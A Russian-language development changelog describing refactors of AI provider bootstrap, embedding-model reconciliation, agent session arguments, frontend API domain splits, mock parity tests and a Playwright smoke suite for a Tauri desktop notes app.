- **`build_hot_providers` → канон** `bootstrap::ProviderSet::from_config` из ИТОГОВОГО сохранённого `local.json` (`apply_ai` уже записал секции `ai.chat`/`ai.fast` формой url+model) с опциями `{agent_tools: false, embedding: false}`. `agent_tools: false` — как `open_vault` (I-5: per-run провайдер агента desktop строит сам). `embedding: false` — эмбеддер хот-путём НЕ пересобирается (на нём висит фоновый индексатор: смена embedding → `embedding_changed=true` → cold/рестарт; прежний контракт СОХРАНЁН). Удалён локальный особый путь: closure `apply_chat_cfg` + ручная сборка трёх провайдеров с единым `saved_chat`-профилем (−100 строк); двойной разбор `pretty` (эгресс + hot-apply) схлопнут в один.
- **Три задекларированные дельты против прежнего пути** (все были запинены `hot_*`): (1) утилитарный fast-провайдер получает СОБСТВЕННЫЙ профиль таймаутов/температуры секции `ai.fast` (прежде — единый профиль сохранённого `ai.chat` вешался на ВСЕ три); (2) дефолт-модель fast → `"fast"` (прежде — цепочка `fast.model → chat.model → "chat"`); (3) пустой/отсутствующий fast → `chat_util` = ТОТ ЖЕ Arc, что `chat_fast` (прежде — ОТДЕЛЬНЫЙ Arc на chat-URL).
- **Смягчение (величина живой дельты мала):** в реальном UI-потоке `apply_ai` замещает секции `ai.chat`/`ai.fast` формой url+model → кастомные таймауты стёрты из `local.json` ДО hot-apply → на практике оба пути дают ДЕФОЛТНЫЙ профиль. Расхождение проявляется ТОЛЬКО на рукописном `local.json` (ряд `hot_custom_saved_profiles_own_sections`); в UI-потоке живая дельта сводится к дефолт-модели fast (`"fast"` vs `"chat"`, ряд `hot_fast_without_model_takes_fast_default`) и идентичности Arc fallback (`hot_empty_fast_falls_back_to_chat_fast_same_arc`) — на поведение чата/примитивов не влияет.
- **Осознанно обновлены 3 из 6 `hot_*`-тестов** (комменты «R-3e: унификация на канон, решение владельца»): `hot_custom_saved_profiles_own_sections` (util-снимок → профиль `ai.fast`/модель "fast"; chat-пара не менялась), `hot_fast_without_model_takes_fast_default` (util-модель → "fast"), `hot_empty_fast_falls_back_to_chat_fast_same_arc` (Arc-идентичность fallback). Остальные три (`hot_full_ui_save_snapshots`, `hot_chat_none_fast_on_provider_defaults`, `hot_nothing_configured_builds_nothing`) — снимки НЕ изменились (в UI-потоке дефолтные секции у канона и прежнего пути совпадают). Хелпер таблицы стал каноничным (`hot_build` из итогового `local.json`, async).
- **Связанный pre-existing баг из BACKLOG (UI-сохранение затирает рукописные таймауты) НЕ чинился здесь** — это merge-семантика `apply_ai` (замещение секций формой url+model), отдельный срез; данный срез его не усугубляет (`apply_ai` не трогался).
- **Краевая fail-safe дельта (вне трёх основных, задокументирована по adversarial-ревью):** если ИТОГОВЫЙ `local.json` не парсится (`LocalConfig::parse == Err` — недостижимо в норме: JSON только что сериализован, `apply_ai` перезаписывает `ai.chat`/`ai.fast` целиком), новый путь сбрасывает провайдеры в `None` (AI выключается до переоткрытия vault), а прежний строил их дефолтным профилем из сырых DTO-аргументов; сбой `GuardedClient` канон глотает (warn→None, команда `Ok`), а прежний путь пробрасывал как ошибку команды. Оба направления fail-safe и согласованы с каноном.
- Гейт: `cargo fmt --all --check` ✅, `cargo clippy --workspace -- -D warnings` ✅, `cargo test --workspace` ✅ (desktop `hot_*` 6/6 зелёные — 3 под каноном, 3 без изменений; #[ignore]-паритет сохранён); `pnpm typecheck` ✅ (фронт-DTO не трогались, крейт пересобран).
...
- Инлайн-блок `#[cfg(test)] mod tests { … }` (тела тестов + ассерты) → `actuator/orchestrate/tests.rs`; в `orchestrate.rs` остаётся `#[cfg(test)] mod tests;` (конвенция как у `agent/session.rs` после R-4: `session/tests.rs` + `mod tests;`). Прод-код `orchestrate.rs` (строки вне `mod tests`) НЕ тронут.
- **Токен-идентичный вынос** (допустимо только де-индент на 4 пробела + rustfmt-переливка длинных строк): `tr -d ' \t\n'`-сравнение старого mod-тела и нового файла — БАЙТ-в-байт (одинаковый sha). Счётчик тестов сохранён (11 `#[test]` + 24 `#[tokio::test]` = 35; `#[ignore]`-паритет: 0/0).
...
| слом mtime-шортката (`files.size_bytes=-1`) | нет | нет | **да** (durable-маркер, ниже) |

- **Обоснование (владелец, §8.5):** исчезает целый класс багов «старые хвосты в поиске/памяти после смены эмбеддера» — desktop оставлял `chat_vectors` под старой моделью (DimMismatch/семантический мусор в памяти переписки при первом же чтении её тем же vault'ом из agentd); core-путь оставлял `chunks` — это был осознанный self-heal-дизайн (desktop-скан доливал векторы по живым chunks через `reconcile_vectors`), но держался на недокументированной асимметрии двух реплик. Канон убирает асимметрию: смена модели = гарантированно чистая полная переиндексация; сохранность self-heal-сценария обеспечена durable-маркером (ниже).
- **Канон** — `nexus_core::vector::reconcile_embedding_model` (единственная реализация): смена модели/dim → полная чистка (таблица выше) + запись новых `settings` + возврат `true`-маркера (desktop передаёт его как `force` в `Indexer::with_rag` — механизм принудительной переиндексации сохранён; agentd логирует). Оба вызывателя переключены: desktop `open_vault`/`build_rag` (реплика + её приватные `get_setting`/`set_setting` удалены; warn-тексты reconcile-ошибок схлопнуты в один «reconcile embedding-модели не удался — RAG отключён») и agentd `build_rag_min` (уже звал core-функцию — получил новую семантику).
- **Durable-маркер переиндексации (catch adversarial-ревью, MAJOR).** `true`-маркер живёт только в процессе вызвавшего, а реконсилить может процесс БЕЗ индексатора заметок: последовательность «always-on agentd стартует первым после смены модели (чистит chunks, пишет новые settings) → desktop открывает vault позже → reconcile уже no-op → `force=false` → mtime+size-шорткат скана пропускает нетронутые файлы» оставила бы заметочный поиск (FTS и векторный) пустым НАВСЕГДА — до R-3d она self-heal'илась именно за счёт выживших chunks. Фикс: чистка в той же транзакции ломает шорткат — `files.size_bytes = -1` (настоящий размер неотрицателен) → ЛЮБОЙ следующий скан перечанкует всё независимо от force, каким бы вызывателем ни был потреблён `true`. Это же закрывает крах ПОСЛЕ записи settings, но ДО завершения переиндексации (файлы остаются помеченными); крах ДО записи settings идемпотентно повторяет чистку. Запинено интеграционным тестом `indexer::tests::scan_after_foreign_reconcile_rebuilds_chunks_without_force` + ассертами маркера в юнит-таблице канона.
...
- **Follow-up вне среза (находки ревью, pre-existing классы):** (1) гонка переоткрытия vault — старый `VaultContext` (живой индексер/чат-путь) замещается ПОСЛЕ `build_rag` нового; `save()` старого хендла в этом окне может воскресить снесённый usearch-файл (класс существовал у обеих реплик до R-3d; кандидат — teardown старого контекста до reconcile); (2) first-run со stale `*.usearch` при пересозданном/битом `nexus.db` — settings пусты → файлы не сносятся (поведение обеих реплик сохранено по спеке R-3d «первый запуск — инициализация без сноса», теперь явно запинено тестом).
...
- **Домен 3: agent → `lib/api/agent/`** (`types.ts` — wire-зеркала `commands::agent`/`agent::connect::wire`/`settings`: `AgentStreamEvent` и спутники (`AgentProposedFile`/`AgentPlanStep`/`AgentPlanStepState`/`AgentSubagentState`/`AgentFileStatus`/`AgentProposedKind`), `AgentAutonomy`/`AgentHistoryMsg`/`AgentApprovalDecision`, история W-38 (`AgentSessionInfo`/`PersistedStep`/`PersistedTurn`/`AgentSessionData`), навыки W-10 (`SkillRow`/`SkillList`), подключение CONN-4/ACP (`AgentConnectionDto`); `index.ts` — вызовы). Состав (из фактической структуры файла): `agent.run` + `approve`/`pause`/`resume`/`cancel`/`undo` (UI-1/AGENT-4/5), `agent.sessions.list`/`load` (W-38), `agent.listSkills`/`setSkillPinned`/`setSkillArchived` (W-10 SL-панель), `agentConnection.set`/`test` (CONN-4/ACP настройки+проба — в барреле остались под прежними именами `settings.setAgentConnection`/`testAgentConnection`). `setAgentFlags`/`AgentFlagsDto` НЕ тронуты — DTO команды settings-домена, свой срез.
- **Домен 4: news → `lib/api/news/`** (`types.ts` — DTO-зеркала `news`/`commands::news`: `NewsItem`/`LlmDownInfo` B12/`NewsRun`/`NewsEndpointHealth` W-39/`NewsPage`/`NewsConfig` W-40/`NewsSource`/`NewsArticle` NF-6; `index.ts` — вызовы). Состав: страница/прочитано/в заметку/refresh (NF-3/5), конфиг+источники+per-host consent (allowHost/disallowHost), ридер article/summarize (NF-6), related (FLOW), прогоны runs/testEndpoint (W-39 диагностика), exportLogs, подписка `newsEvents.onNewsProgress` (`news:progress` → через `subscribe` bridge; в барреле — реэкспорт `events.onNewsProgress`).
- **`agent.run` — честное bridge-исключение** (по списку в шапке `bridge.ts`, как `chat.streamRag`): стрим-команда с `Channel` (канал + `onmessage` + Promise<run_id>, ошибка → `error`-событие И reject) — не request/response-форма `bridge`, перенесена ПРЯМЫМ `invoke` с комментом в домене. `news.exportLogs` — второе честное исключение (OS-диалог `saveDialog` → `invoke`, как `backup`/`vault.pickDirectory` в F-2a). Остальные вызовы двух доменов — через `bridge`.
- **Кросс-доменный payload** `LinkSuggestion` (suggest-домен, результат `news.related`) остался в барреле до своего среза F-2d+; `news/index.ts` берёт его type-only импортом (в рантайме стирается — цикла нет, тот же паттерн, что у `chat/types.ts`).
- **Parity-капкан (а) НЕ ослаблен:** `mock/parity.test.ts` по-прежнему выводит варианты из ТИПА `AgentStreamEvent` (`satisfies Record<Union['type'], true>`), импорт теста переведён на доменный источник `lib/api/agent/types` (тот же тип, что был через баррел-реэкспорт).
- **Ratchet инлайн-моков:** инлайн-моков у agent/news доменов НЕ БЫЛО — все моки уже жили в `mock/agent.ts`/`mock/news.ts`/`mock/settings.ts` (connection делит in-memory конфиг с `getAiConfig` — мок остался в `mock/settings.ts`); фактическое число по скоупу пересчитано — 18, baseline parity-гейта (в) остался 18 (история в комменте дополнена).
- В барреле — реэкспорт (`agent`, `news`, типы, `events.onNewsProgress`, `settings.setAgentConnection`/`testAgentConnection`); секции agent/news из tauri-api.ts удалены (1715 → 1290 строк). Остальные домены (memory/episode/search/graph/…) — следующие срезы F-2d+.
- Гейт: `tsc --noEmit` ✅, `eslint --max-warnings 0` ✅, vitest полный 1341/1341 + coverage ✅, **Playwright e2e-смоук 28/28 ×2** (вкл. агентские сценарии: полный прогон с proposal→approve; exec-пара; research-отчёт; news-вью из ActivityBar) ✅.

### Изменено · R-4 — `run_agent_session`: 14 позиционных аргументов → `SessionSpec` + `SessionDeps` + `SessionRole`

Стадия R-4 REFACTOR-PLAN §3 (thermo-смелл №7 + критик «session.rs 1079 строк»). **Behavior-preserving**: оракул — существующие тесты (session/runner/delegate/handler/job/desktop/cli/acp) зелёные БЕЗ правок ожиданий (в тестах менялась только КОНСТРУКЦИЯ вызова, ассерты не тронуты); wire-тесты connect/acp не менялись.

- **`SessionDeps<'a>`** — хендлы прогона (provider/memory/skills/web/decision_source/writer/reader/paused/cancel/forwarder), раньше шедшие десятью позиционными аргументами с колонками `None, // …`-комментариев у шести прод-вызывателей (agentd job / connect-handler / acp-server / cli / desktop drive_run / delegate spawn). Именованные поля вместо builder'а: состав хендлов у всех вызывателей ОДИН, различаются только `Option`-каналы фич (`memory`/`skills`/`web`; `None` = фича выключена — контрактное поведение, не франкен-вариативность).
- **`enum SessionRole<'a> { TopLevel { delegation, research }, Subagent { allowed, dispatcher } }`** — роль прогона типом: инвариант «субагент БЕЗ delegation/research» (рекурсия-стоп, «дети не ресёрчат») раньше держался только комментариями — теперь невалидная комбинация НЕПРЕДСТАВИМА (каналы delegation/research существуют только в `TopLevel`; сужение реестра/общий gate — только в `Subagent`). `SubagentSpawn` поглощён вариантом `Subagent` (поля те же); `CHILD_BLOCKED_TOOLS`-инвариант остался где был (`build_child_registry` — вторая линия обороны). `should_register` research и его юнит-тесты не менялись (top-level-условие теперь гарантирует ветка типа).
...
- **cli `build_deps` (общий для `nexus agent` и `nexus acp` — у acp своей копии не было, он на shared `build_deps`) собирает провайдеров каноном** `bootstrap::ProviderSet::from_config` с cli-профилем R-3a-таблицы `{agent_tools: true, embedding: false}` (агенту нечем думать без tool-провайдера; RAG-фундамент cli не строит — сетевой пробы dim нет). Tool-провайдер внутри канона — ТОТ ЖЕ `ai::tools::build_agent_tool_provider`, который cli звал напрямую (cli был «полуканоничен» с R-3a). Задекларированная дельта: канон попутно конструирует chat-каналы (chat/chat_fast/chat_util), которые cli не использует, — конструкция локальна и дешева (без сети/БД-записей: у `GuardedClient::for_*` side-эффектов нет; tracing-подписчика у cli нет — логи сборки не печатаются); отдельная опция гейтинга chat-пары НЕ заводилась (не изобретать различий; desktop-литералы `ProviderSetOptions` вне скоупа параллельного F-2a).
- **`load_local_config` — хвосты канона №2 закрыты.** Реплика agentd `main.rs` удалена (тело было байт-идентично канону, включая warn-текст — 3 call-site на `use` канона). Для cli канон №2 получил СТРУКТУРНУЮ форму `read_local_config → Result<LocalConfig, LocalConfigError {Unreadable | Parse}>`: Option-канон `load_local_config` (desktop/agentd) и cli-онбординг-проекция (`Result<_, String>`, ПРЕЖНИЕ тексты «нет …/local.json — задай LLM-эндпоинт…» / «…: битый JSON (config: …)» с различением причин и полным путём) — обе тонкие проекции над ним; sync-реплика cli удалена (единственный сдвиг формы — cli-обёртка стала async, вызыватель `build_deps` и так async).
- **Характеризация.** Коммит 1: снимки `debug_params` tool-провайдера, собранного СТАРЫМ cli-путём (полный конфиг с посторонними fast/embedding-секциями — на состав `Deps` не влияют; кастомные INFER-CFG-таймауты/`/v1`-хвост/дефолт-модель "chat") + model/context_window до `Deps` + ВСЕ тексты ошибок онбординга (нет ai.chat / нет local.json / битый JSON) — 5 тестов `boot_*` по ЖИВОМУ `build_deps` на временном vault, зелёные на старом коде. Коммит 2: переключение с ТЕМИ ЖЕ ассертами (механическая адаптация: `.await` у двух прямых вызовов `load_local_config`); +юнит структурной формы канона №2 (`Unreadable`/`Parse` различаются). Smoke живым бинарём с мёртвым эндпоинтом: stdout/stderr/exit-код байт-в-байт со старым бинарём (чистая деградация, прежние тексты).
...
- **`open_vault` собирает провайдеров каноном** `bootstrap::ProviderSet::from_config` с опциями desktop `{agent_tools: false, embedding: true}` (I-5: tool-провайдер НЕ строится на открытии vault — per-run провайдер агента desktop по-прежнему строит `commands/agent.rs` через канонный `ai::tools::build_agent_tool_provider`; граница НЕ менялась). Локальные реплики `build_chat`/`build_util_chat`/`apply_chat_cfg` и embedder-часть `build_rag` удалены (−130 строк дубля); `build_rag` теперь только reconcile (§6.5, локальный desktop-`reconcile_embedding_model` НЕ менялся — вне канона, кандидат R-3d) + открытие четырёх usearch-индексов поверх канонного `EmbeddingBootstrap` (зеркало agentd `build_rag_min`); эмбеддер попадает в `AIClient` по-прежнему ТОЛЬКО из собранного RAG-бандла.
- **Характеризация.** Коммит 1: снимки ВСЕХ конфиг-наблюдаемых параметров (`debug_params`) сняты со СТАРЫХ desktop-строителей на 5 конфигах (полный / без fast / без embedding / кастомные таймауты / пустой) — 9 тестов `boot_*` зелёные на старом коде. Коммит 2: сборка переключена на канон С ТЕМИ ЖЕ ассертами (+ гейт-тест «desktop-опции не строят agent_tools»); существующий AC-EGR-13-тест общего policy — механическая адаптация вызова, ассерты не менялись.
- **Декларируемое изменение — ТОЛЬКО тексты логов сборки** (дрейф копий, зафиксированный в R-3a, схлопнут в канонные): «probe-клиент не построился / проба размерности не удалась / эмбеддер не инициализирован — RAG отключён» → «… — embedding выключен» (решение об off RAG — у вызывающего; итоговая строка «RAG включён» осталась desktop-строкой), «ai.fast: провайдер не создан — fallback на gemma-fast» → «…fallback на chat_fast»; warn реплики agent.rs «agent_run: local.json не распарсен — дефолты» → канонный «local.json: разбор не удался — AI отключён». Порядок стартовых логов открытия vault сдвинут как в agentd R-3a (chat/util-строки раньше RAG-строки; сетевая проба dim по-прежнему первая; reconcile/открытие индексов — локальные side-effects, поведенчески эквивалентно).
- **`load_local_config` — канон №2 в `bootstrap`** (чтение+разбор `.nexus/local.json`, один на открытие): обе desktop-реплики (`commands/vault.rs`, `commands/agent.rs`) переключены и удалены; реплики agentd/cli — кандидаты R-3c (+юнит канона: нет файла/битый JSON → None).
- **hot-apply `set_ai_config` НЕ переключён (решение R-3b)** — байт-в-байт с каноном невозможен: (1) все три хот-провайдера живут на ЕДИНОМ профиле таймаутов/температуры СОХРАНЁННОГО `ai.chat` (EndpointDto из UI не несёт таймаутов) — канон дал бы утилитарному собственный профиль `ai.fast`; (2) URL-fallback fast→chat строит ОТДЕЛЬНЫЙ провайдер на chat-URL с цепочкой модели fast.model→chat.model→"chat" — канон отдаёт ТОТ ЖЕ Arc, что chat_fast, и дефолт-модель "fast". Особый путь оставлен с честным комментом «кандидат унификации — поведенческое изменение, решение отдельным срезом»; конструкция извлечена в `build_hot_providers` (механически, байт-в-байт) и запинена ОТДЕЛЬНОЙ фикстурной таблицей `tests::hot_*` (6 тестов: UI-сейв / URL-fallback (отдельный Arc) / цепочка модели / рукописный конфиг с кастомными профилями chat+fast (chat-профиль побеждает ВЕЗДЕ) / chat=None (провайдер-дефолты) / пусто) — база владельческого решения об унификации.
...
- **Новый модуль `nexus-core::bootstrap` (сервер-паритет §8.3, без tauri-типов).** Канон №1 `ProviderSet::from_config(cfg, policy, audit, opts)`: chat-пара (reasoning+fast из `ai.chat`) + утилитарная `ai.fast` (всегда `without_reasoning`, fallback на `chat_fast` — ТОТ ЖЕ Arc) + tool-провайдер агента (делегат в уже-канонический `ai::tools::build_agent_tool_provider` — НОВЫХ construction-site `OpenAiToolProvider::new` не добавлено) + embedding-фундамент (`EmbeddingBootstrap {embedder, model, dim}`; проба размерности 30 с при незаданном `dim`). НАМЕРЕННЫЕ различия вызывателей — параметрами `ProviderSetOptions {agent_tools, embedding}` (desktop держит `agent_tools=None` по I-5; cli не строит embedding), не копиями. ЗА КАДРОМ канона намеренно: `reconcile_embedding_model` + открытие usearch-индексов (vault-состояние, отдельный срез), `LocalConfig::load` (канону не нужен — принимает `&LocalConfig`; реплики ×3-4 остаются кандидатом отдельного среза), hot-apply `set_ai_config` desktop (особый EndpointDto-путь).
- **Внедрение ТОЛЬКО в agentd** (desktop — R-3b, cli — R-3c): локальные реплики `build_chat_min`/`build_util_chat_min`/`build_agent_tools_min`/`apply_chat_cfg` и embedder-часть `build_rag_min` удалены (−150 строк дубля); `build_rag_min` теперь только reconcile+индексы поверх канонного `EmbeddingBootstrap`; эмбеддер попадает в `AIClient` по-прежнему ТОЛЬКО из собранного RAG-бандла (усечённых состояний не добавлено).
- **Характеризация (двухкоммитный приём R-2).** Коммит 1: снимки ВСЕХ конфиг-наблюдаемых параметров (url/model/temperature/first_token/idle/retry/reasoning/dim/префиксы + профиль guarded-клиента с его таймаутом) сняты со СТАРЫХ строителей agentd на 5 конфигах (полный / без fast / без embedding / кастомные таймауты / пустой) — 10 тестов зелёные на старом коде. Коммит 2: сборка переключена на канон С ТЕМИ ЖЕ ассертами. Наблюдаемость: `GuardedClient::debug_profile()` (таймауты иначе спрятаны в tune-замыкании), ручной `Debug` у `OpenAi{Chat,Tool}Provider`/`OpenAiEmbedder`, `doc(hidden) debug_params()` на трейт-объектах (дефолт пуст — моки не тронуты). +4 юнита состава/гейтинга в core.
- **Зафиксированный сдвиг порядка стартовых логов/локальных side-effects agentd:** RAG-строка теперь после chat/util/tools (все переставленные операции локальны; сетевая проба dim по-прежнему первая) — поведенчески эквивалентно.
- **Зафиксированный дрейф копий (НЕ чинился молча, все значения параметров совпадали):** только тексты логов — desktop «RAG отключён»/«fallback на gemma-fast» vs agentd «RAG off»/«fallback на chat_fast» (канон говорит «embedding выключен»/«chat_fast»; desktop-тексты уйдут в R-3b); hot-apply `settings.rs::set_ai_config` строит fast-провайдер на ЕДИНОМ `saved_chat`-профиле таймаутов и с URL-fallback'ом на chat (задокументированный особый путь UI — кандидат унификации R-3b).

### Добавлено · P0-3 — Playwright-смоук браузерной сборки (web+mock-слой, НЕ shipped-app)

Последний пререквизит фронт-волны рефакторинга (REFACTOR-PLAN §2 P0-3): первый межкомпонентный авто-оракул фронта — юниты сторов не ловили проводку App↔ActivityBar↔оверлеи↔Esc. **Честность (W-22):** смоук доказывает прод-сборку Vite + мок-слой `lib/mock/*` под webkit (ближайший к WKWebView), НЕ поведение shipped Tauri-app — зафиксировано в имени CI-джобы и `apps/desktop/e2e/README.md` (там же правило «новая main-вью/оверлей → добавь в смоук»).

- **Инфраструктура:** `@playwright/test` 1.61.1 devDependency воркспейса; конфиг `apps/desktop/e2e/playwright.config.ts` (единственный проект webkit; `vite preview` прод-сборки на выделенном порту 4173 поднимает webServer-секция; без ретраев); скрипт `pnpm e2e`.
- **Фикстура:** бутстрап (онбординг пройден → «Открыть vault» → мок-волт) + **console-гейт**: каждый тест валится при `console.error`/`pageerror`; whitelist пуст by design.
- **Сценарии (28):** nav-смоук (все main-вью из ActivityBar + попарные переключения с усиленным оракулом — после каждой пары `to` закрывается тоглом и под ней обязан быть редактор, а не stale-вью + SWITCH_MAIN/ST-D1 гасит слои), overlay-смоук (17 сценариев оверлеев/панелей вкл. QuickCapture/TemplatePicker/Историю версий/режим чтения с Esc-прецедентом: якорь + Esc-семантика кодифицирована КАК ЕСТЬ — Граф/Sync/Плагины закрываются только явной кнопкой), editor/preview (CM6 → LP-алиас → буквица `p[data-dropcap]` + race-регрессия EDFIX-4 + чистые ссылки), чат (sources → стрим → done; «демо-ошибка» → error без падения), агент (план, дерево субагентов, changeset → «Подтвердить» → свёртка в итог; exec-пара песочницы → command-узел графа; «отчёт» → research-карточка дока), персист настройки «Чистые ссылки» через reload. Триггерные сценарии (exec/report/демо-ошибка) опираются на узкие P0-2-маркеры моков.
- **CI:** джоба `e2e-web-smoke` в `ci.yml` (ubuntu, кэш браузеров по версии @playwright/test, `--with-deps webkit`, артефакт playwright-report+скриншоты на фейле). Блокирующая по дисциплине конвейера (красный смоук = не мержим); required-checks в настройках репо не включены — владельческая настройка, вопрос поднят отдельно.
- Детерминизм: web-first assertions, без sleep; локальный гейт ×2 подряд зелёный; e2e-типы входят в `pnpm typecheck` (include tsconfig). Непокрытые зоны фронта — честным списком в e2e/README.md.

### Исправлено · Смоук поймал три живых бага фронта (console-гейт + Esc-baseline)

- **Кнопка Castor в ActivityBar была мертва:** `openAgent` передавался в `onClick` голой ссылкой → MouseEvent попадал в опциональный `seed`, `seed.trim()` бросал TypeError, вью не открывалась (регресс P1-11 «Быстрый старт», задел единственный колл-сайт — остальные обёрнуты). Фикс: `() => openAgent()`.
- **Esc и focus-trap шпаргалки «Горячие клавиши» не работали:** `HotkeysCheatsheet` смонтирован в App.tsx всегда, а `useFocusTrap` (deps `[]`) отрабатывал при `open=false` (ref=null → ранний return) и не перевешивался при открытии — Esc не закрывал, фокус внутрь не переводился (a11y P9 сломан). Фикс: гейт `if (!open) return null` вынесен во внешний компонент, окно с трапом монтируется только открытым (паттерн остальных панелей). Аудит остальных потребителей `useFocusTrap` — чисто (все монтируются условно).
- **Регресс reading-esc-precedence:** оверлеи, закрывающие себя по Esc без stopPropagation (палитра/QuickCapture/TemplatePicker), обновляют стор синхронно — window-гейт App.tsx видел уже-закрытое состояние, и ОДИН Esc гасил и оверлей, и режим чтения «сквозь» него (вопреки задокументированному инварианту). Фикс: `e.defaultPrevented`-гейт в reading-Esc (паттерн useKeymap «обработано ближе к фокусу — не дублируем») + недостающий `preventDefault` в пустой ветке TemplatePicker. Кодифицировано e2e-сценарием (палитра поверх чтения: 1-й Esc — только палитра, 2-й — выход из чтения).

### Изменено · R-2 — канонический `outcome_to_finish` (дедуп маппинга исход→терминал ×5 → 1)

Срез REFACTOR-PLAN §3 R-2 (thermo-смелл №13): маппинг `LoopOutcome → (статус, текст)` терминала прогона был скопирован ×5 — desktop `finish_in_store` / connect-handler / ACP-сервер / agentd-джоба (инлайн в `drive`) / CLI (спека называла ×4; пятая копия найдена grep'ом по характерным текстам) — и уже дрейфовал (B13: CLI терял `Paused`-арм). **Строго behavior-preserving**: статусы и тексты каждого вызывателя байт-в-байт (эти строки уходят в run_store/историю прогонов/UI).

- **Канон `nexus_core::agent::finish::outcome_to_finish(outcome, PausePolicy, CancelWording) → RunFinish`** — единственный источник статусов/текстов финализации. Различия вызывателей НЕ унифицированы молча — они сохранены ЯВНЫМИ параметрами: `PausePolicy` (`FinalizeError` — one-shot пути финализируют паузу терминальным `error` «прогон приостановлен (kill-switch); …»; `Requeue` — agentd-джоба получает `RunFinish::Park` и паркует прогон: `requeue_to_queued` + пере-кью на un-pause, AGENT-5 чек-пойнт #2) и `CancelWording` (pre-existing расхождение «прогон отменён; …» vs историческое CLI-шное «отменён; …» — зафиксировано параметром, НЕ «починено» молча). Специфичные не-run_store проекции (ACP `stopReason`) остаются тонкими у вызывателей — «прямое > магического», канон несёт общее ядро, не франкен-тип.
- **Все 5 вызывателей переключены, локальные копии удалены**: `connect/handler.rs` и `connect/acp/server.rs` (инлайн-вызов канона на месте финализации), `agent/job.rs` (ветки 7a/7b теперь единый match `Park`/`Finalize`; поведение парковки паузы не изменено — живой прогон по-прежнему доказывает `paused_actuator_run_writes_nothing_and_requeues`), `nexus-cli/agent.rs` (тонкая проекция `cli_finish` с CLI-параметрами; P0-1-тесты B13 адаптированы к канону, их ассерты сохранены), desktop `finish_in_store` (тело — канон + прежняя запись `finish_run`; сигнатура для вызывателей не менялась).
- **Доказательство «байт-в-байт до/после» характеризацией**: отдельным ПЕРВЫМ коммитом фикстурные таблицы вариант→(статус, текст) закреплены точными ассертами против СТАРЫХ локальных копий (cli/handler/acp/desktop; job — source-дифф: его армы байт-идентичны handler минус Paused-арм, который паркуется до match) и прогнаны зелёными; после дедупа ТЕ ЖЕ ассерты зелёные против канон-путей.
- Тесты: юнит-таблица канона ×5 (варианты × политики × формулировки: общие армы инвариантны к параметрам; Cancelled-текст — только от `CancelWording`; судьба Paused — только от `PausePolicy`; `FinalizeError` никогда не даёт `Park` → `expect_finalize` безопасен по построению + should_panic на `Park`); характеризация per-caller ×5 (desktop дополнительно пинит записанный терминал в run_store). Существующие ожидания тестов не правлены (кроме механической адаптации вызова в cli-тестах P0-1). Полный гейт: `cargo fmt --check` / `clippy --workspace --all-targets -D warnings` / `cargo test --workspace` — зелёные.

### Исправлено · P0-2 — мок-паритет с бэкендом (браузер-моки = зеркало Rust-wire) + авто-гейт полноты

Срез REFACTOR-PLAN §2 P0-2 (thermo-смелл №14): браузер-моки молча теряли часть контракта — «зелено врало by construction» (класс MEM-5, mock-must-match-backend). Формы всех событий сверены с Rust поле-в-поле (`agent::connect::wire::AgentStreamEvent`, `commands::chat::ChatStreamEvent`, `chat_log::MemoryHit`, `episode::EpisodeHit`).

- **mock/agent.ts — полное покрытие юниона `AgentStreamEvent` (14/14).** Мок не эмитил `execProposal`/`execResult`/`report`/`error`. Добавлены УЗКИЕ триггеры по тексту задачи (дефолтный сценарий не тронут; анти-футган для смоуков): слово `exec` (границы слова; «execute» не триггерит) → пара `execProposal`→`execResult` после плана (SANDBOX-6c: силуэт без argv, exit-код без stdout — приватность §5.6; пара моделирует exec, уже одобренный host-side у connected/ACP-бэкенда — десктоп для exec-решений зритель, W-26; пауза/kill-switch подавляет «исполнение» между парой); «report/отчёт» → `report` после фазы changeset, перед `final` (RES-5); демо-маркер «демо-ошибка»/«demo-error» → терминальный `error` без `final` (обычное слово «ошибка» прогон не роняет). Все `runId`/`actionId`/`exitCode`/`sourcesCount` — camelCase как на проводе.
- **mock/vault.ts `streamChat` — все опции `chat_rag` приняты и наблюдаемы; события памяти живы.** Раньше в мок уходили только `{k, grounded, web}` — `rerank`/`memory`/`agentMemory`/`episodic`/`deep`/`pinned`/`sessionId`/`center` молча выбрасывались, `memorySources`/`episodeSources` не эмитились вовсе (чипы памяти в превью мертвы). Теперь: дефолты = дефолтам бэкенда (`memory=true` → чипы памяти видны в превью из коробки); порядок событий как в `chat_rag` (sources → episodeSources → memorySources → reasoning… → token… → done|error); эпизоды считаются первыми и глушат свои сессии в памяти переписки (дедуп exclude_sessions), `sessionId` исключается; `k` клампится 1..20; `rerank` — пайплайн «ретрив глубже (24) → переупорядочивание → обрезка до k»; `center` — граф-буст соседей открытого файла; `deep` — reasoning-события ТОЛЬКО в «Глубоком» (зеркало chat vs chat_fast): живые сводки ПО ХОДУ + ФИНАЛЬНАЯ `reasoningSummary` ПОСЛЕ конца токенов перед `done` (живой порядок chat.rs — «summary всегда до token» на проводе неверно); `pinned` — зеркало `is_pinnable` (.md без dot-компонентов, бюджет 5); демо-маркер «демо-ошибка»/«demo-error» → терминальный `error` (+`deniedKind:'offline'` при «офлайн», форма AC-EGR-14; легитимный вопрос со словом «ошибка» мок не роняет). `tauri-api.ts` передаёт в мок ВСЕ опции.
- **Авто-гейт полноты (`mock/parity.test.ts`) — защита от будущего дрейфа.** (а)/(б) списки вариантов выводятся из ТИПА (`satisfies Record<Union['type'], true>`: новый вариант юниона ломает typecheck, пока не внесён в список; невыэмиченный вариант — красный runtime-тест, равенство множеств). Mutation-проверено: выключение эмиссии `report` (агент) и `memorySources` (чат) — тест красный. (в) baseline литеральных инлайн-моков в tauri-api.ts зафиксирован (23 `Promise.resolve(`-ветки) с ассертом «не больше» — полная миграция в `mock/*` остаётся стадией F-2.
- Тесты: гейты полноты ×3; exec/report/error сценарии агента (порядок в ленте, формы байт-в-байт через `Object.keys`, пауза exec-пары, негативы триггеров «execute»/«ошибка») ×6; опции чата (порядок и формы hit'ов, дедуп эпизоды↔память, sessionId, дефолты, deep с финальной сводкой, rerank-порядок, center-буст, кламп k, pinned-фильтр, agentMemory, error/deniedKind + легитимная «ошибка» не роняет) ×8. Полный гейт: typecheck 0 / eslint --max-warnings 0 / vitest зелёный.

### Исправлено · Чат — типизированный баннер отказа эгресса реально доходит до фронта (AC-EGR-14)

